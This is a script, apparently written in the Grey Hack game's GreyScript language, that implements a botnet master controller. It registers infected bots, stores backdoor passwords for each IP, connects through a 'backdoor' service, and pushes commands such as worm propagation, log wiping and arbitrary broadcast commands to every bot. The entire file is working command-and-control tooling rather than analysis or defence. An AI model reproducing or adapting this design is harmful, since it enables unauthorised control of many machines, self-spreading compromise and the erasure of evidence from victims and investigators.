// master_controller.gs – final corrected version
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/file_search.gs")
import_code("/scripts/utils/sanitize_ip.gs")

BOTNET_DIR = "/root/.botnet/bots"
COMMAND_QUEUE_DIR = "/root/.botnet/outgoing"
INCOMING_DIR = "/root/.botnet/incoming"
VERSION = "1.0"

// Security: Whitelist allowed scripts and validate arguments
allowed_scripts = ["/bin/slave.gs", "/bin/worm.gs", "/scripts/utils/wipe_logs.gs", "/scripts/utils/file_search.gs"]

validate_script_args = function(script, args)
    // Check if script is in whitelist
    if allowed_scripts.indexOf(script) == null then return false
    
    // Whitelist approach: only allow alphanumeric, dots, dashes, underscores, slashes
    allowed_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-_/"
    
    for arg in args
        if arg.len > 256 then return false  // Max arg length
        for c in arg
            if allowed_chars.indexOf(c) == null then return false
        end for
    end for
    
    return true
end function

get_backdoor_pass = function(ip)
    pass_file = "/root/.botnet/backdoor_pass_" + ip + ".enc"
    pass = retrieve_password_kyber(pass_file)
    if pass == null then
        // Check for legacy XOR password
        legacy_file = "/root/.botnet/backdoor_pass_" + ip
        legacy_pass = read_file(legacy_file)
        if legacy_pass then
            pass = xor_obfuscate(legacy_pass, "botnet_key_2026")
            // Migrate to Kyber
            store_password_kyber(pass_file, pass)
            get_shell.host_computer.File(legacy_file).delete
        else
            pass = generate_random_string(16)
            store_password_kyber(pass_file, pass)
        end if
    end if
    return pass
end function

init_master = function()
    comp = get_shell.host_computer
    comp.create_folder("/root", ".botnet")
    comp.create_folder(BOTNET_DIR, "bots")
    comp.create_folder(COMMAND_QUEUE_DIR, "outgoing")
    comp.create_folder(INCOMING_DIR, "incoming")
    
    if not read_file("/root/.botnet/master.priv") then
        lock_path = "/root/.botnet/keygen.lock"
        
        // Atomic lock: touch returns 1 if file was created, 0 if already existed
        lock_result = comp.touch("/root/.botnet", "keygen.lock")
        
        if lock_result == 0 then
            // Another process already holds the lock
            wait(3)
            // Key should exist now
            if read_file("/root/.botnet/master.priv") then return
            // If still no key after waiting, other process may have crashed
            // Try again
        end if
        
        // We have the lock - double-check key doesn't exist
        if read_file("/root/.botnet/master.priv") then
            comp.File(lock_path).delete
            return
        end if
        
        // Generate keys
        keys = Kyber.generate_keypair()
        if keys and keys.private and keys.public then
            write_file("/root/.botnet/master.priv", keys.private)
            set_permissions("/root/.botnet/master.priv", "600")
            write_file("/root/.botnet/master.pub", keys.public)
            set_permissions("/root/.botnet/master.pub", "644")
            log_master("Generated master keypair", "INFO")
        end if
        
        // Release lock
        comp.File(lock_path).delete
    end if
end function

register_bot = function(ip, pubkey_enc)
    priv = read_file("/root/.botnet/master.priv")
    pubkey = Kyber.decrypt_message(priv, pubkey_enc)
    write_file(BOTNET_DIR + "/" + ip + ".pub", pubkey)
    set_permissions(BOTNET_DIR + "/" + ip + ".pub", "644")
    log_master("Registered bot " + sanitize_ip(ip), "SUCCESS")
end function

send_command = function(ip, command)
    pubkey = safe_file_read(BOTNET_DIR + "/" + ip + ".pub")
    if not pubkey then
        log_master("Bot " + sanitize_ip(ip) + " not registered", "ERROR")
        return false
    end if
    cipher = Kyber.encrypt_message(pubkey, command)
    if cipher == null then return false
    
    tmp_file = "/tmp/cmd_" + str(time) + ".enc"
    safe_file_write(tmp_file, cipher)
    set_permissions(tmp_file, "600")
    
    // Retry connection up to 3 times
    connect_func = function()
        return get_shell.connect_service(ip, 22, "backdoor", get_backdoor_pass(ip))
    end function
    
    shell = retry_network(connect_func, 3, 2)
    if typeof(shell) == "string" or shell == null then
        log_master("Connect to " + sanitize_ip(ip) + " failed after retries", "ERROR")
        get_shell.host_computer.File(tmp_file).delete
        return false
    end if
    
    get_shell.scp(tmp_file, "/root/.botnet/commands/", shell)
    get_shell.host_computer.File(tmp_file).delete
    return true
end function

collect_responses = function()
    for ip in list_bots()
        // Use retry_network wrapper for connection resilience
        connect_func = function()
            return get_shell.connect_service(ip, 22, "backdoor", get_backdoor_pass(ip))
        end function
        
        shell = retry_network(connect_func, 3, 2)
        if typeof(shell) == "string" or shell == null then
            log_master("Failed to collect from " + sanitize_ip(ip) + " after retries", "WARN")
            continue
        end if
        
        resp_dir = shell.host_computer.File("/root/.botnet/responses")
        if resp_dir == null then continue
        for f in resp_dir.get_files
            if f == null then continue
            if f.name[-4:] == ".enc" then
                cipher = f.get_content
                if cipher == null then continue
                priv = read_file("/root/.botnet/master.priv")
                if priv == null then continue
                resp = Kyber.decrypt_message(priv, cipher)
                if resp == null then continue
                log_master("Response from " + sanitize_ip(ip) + ": " + resp, "INFO")
                write_file(INCOMING_DIR + "/" + ip + "_" + f.name, resp)
                set_permissions(INCOMING_DIR + "/" + ip + "_" + f.name, "600")
                f.delete
            end if
        end for
    end for
end function

list_bots = function()
    comp = get_shell.host_computer
    bots = []
    bot_dir = comp.File(BOTNET_DIR)
    if bot_dir == null then return bots
    for f in bot_dir.get_files
        if f == null then continue
        name = f.name
        if name.len > 4 then
            if name[-4:] == ".pub" then bots.push(name[:-4])
        end if
    end for
    return bots
end function

search_bot_files = function(ip, pattern, flags)
    send_command(ip, "run /scripts/utils/file_search.gs " + pattern + " " + flags)
    wait(2)
    collect_responses()
end function

command_loop = function()
    print(blue("Master Controller v" + VERSION))
    print(white("Commands: list, status, run <ip> <script> [args], kill <ip> <script>, worm <ip> <depth>, search <ip> <pattern> <flags>, clean <ip>, logs, broadcast <cmd>, exit"))
    while true
        input = user_input(white("master> "))
        parts = input.split(" ")
        if parts.len == 0 then continue
        
        if parts[0] == "list" then
            bots = list_bots()
            print(white("Bots: " + bots.len + " registered"))
            for ip in bots
                print(white("  " + sanitize_ip(ip)))
            end for
        else if parts[0] == "status" then
            for ip in list_bots()
                send_command(ip, "status")
            end for
            wait(2)
            collect_responses()
        else if parts[0] == "run" then
            if parts.len < 3 then
                print(red("Usage: run <ip> <script> [args]"))
            else
                script = parts[2]
                args = parts[3:]
                if not validate_script_args(script, args) then
                    print(red("ERROR: Script not allowed or invalid arguments"))
                else
                    cmd = "run " + script + " " + (args.join(" "))
                    send_command(parts[1], cmd)
                end if
            end if
        else if parts[0] == "kill" then
            if parts.len < 3 then
                print(red("Usage: kill <ip> <script>"))
            else
                script = parts[2]
                if allowed_scripts.indexOf(script) == null then
                    print(red("ERROR: Script not allowed"))
                else
                    send_command(parts[1], "kill " + script)
                end if
            end if
        else if parts[0] == "worm" then
            if parts.len < 3 then
                print(red("Usage: worm <ip> <depth>"))
            else
                send_command(parts[1], "worm /root/.botnet/master.pub " + parts[2])
            end if
        else if parts[0] == "clean" then
            if parts.len < 2 then
                print(red("Usage: clean <ip>"))
            else
                send_command(parts[1], "clean")
            end if
        else if parts[0] == "search" then
            if parts.len < 4 then
                print(red("Usage: search <ip> <pattern> <flags>"))
            else
                search_bot_files(parts[1], parts[2], parts[3])
            end if
        else if parts[0] == "logs" then
            for ip in list_bots()
                // Use 'read' command (slave now handles it)
                send_command(ip, "read /root/.botnet/log.txt")
            end for
            collect_responses()
        else if parts[0] == "broadcast" then
            if parts.len < 2 then
                print(red("Usage: broadcast <command>"))
            else
                cmd = parts[1:].join(" ")
                for ip in list_bots()
                    send_command(ip, cmd)
                end for
            end if
        else if parts[0] == "exit" then
            break
        else
            print(red("Unknown command: " + parts[0]))
        end if
    end while
end function

init_master()
command_loop()
